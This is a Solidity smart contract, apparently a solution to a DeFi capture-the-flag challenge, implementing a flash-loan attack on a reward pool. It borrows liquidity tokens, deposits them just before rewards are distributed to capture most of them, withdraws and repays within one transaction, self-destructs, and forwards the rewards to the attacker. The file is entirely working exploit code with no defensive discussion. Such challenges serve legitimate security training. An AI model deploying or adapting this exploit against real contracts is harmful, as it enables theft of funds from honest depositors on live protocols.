// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ILender {
    function flashLoan(uint256 amount) external;
}

interface IRewardPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
    function distributeRewards() external returns (uint256);
}


contract RewarderPoolExploit {
    address public owner;
    IRewardPool public pool;
    ILender public lender;
    IERC20 public rewardToken;
    IERC20 public liquidityToken;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    modifier onlyLender() {
        require(msg.sender == address(lender), "Not pool");
        _;
    }

    constructor(address _pool, address _lender, address _rewardToken, address _liquidityToken) {
        owner = msg.sender;
        pool = IRewardPool(_pool);
        lender = ILender(_lender);
        rewardToken = IERC20(_rewardToken);
        liquidityToken = IERC20(_liquidityToken);
    }

    function receiveFlashLoan(uint256 amount) public onlyLender {
        // Attack:
        // 1) flashloan liquidityToken from lender and deposit into reward pool, granting the attacker the vast majority of accToken.
        // 2) claim most of the rewards
        // 3) Withdraw liquidity tokens and repay flashloan
        // 4) profit

        liquidityToken.approve(address(pool), amount);

        pool.deposit(amount);
        pool.distributeRewards();
        pool.withdraw(amount);
        liquidityToken.transfer(msg.sender, amount);
        selfdestruct(payable(msg.sender));
    }

    function attack(uint256 amount) external onlyOwner {

        lender.flashLoan(amount);
        uint256 rewardBalance = rewardToken.balanceOf(address(this));
        
        rewardToken.transfer(msg.sender, rewardBalance);
    }
}
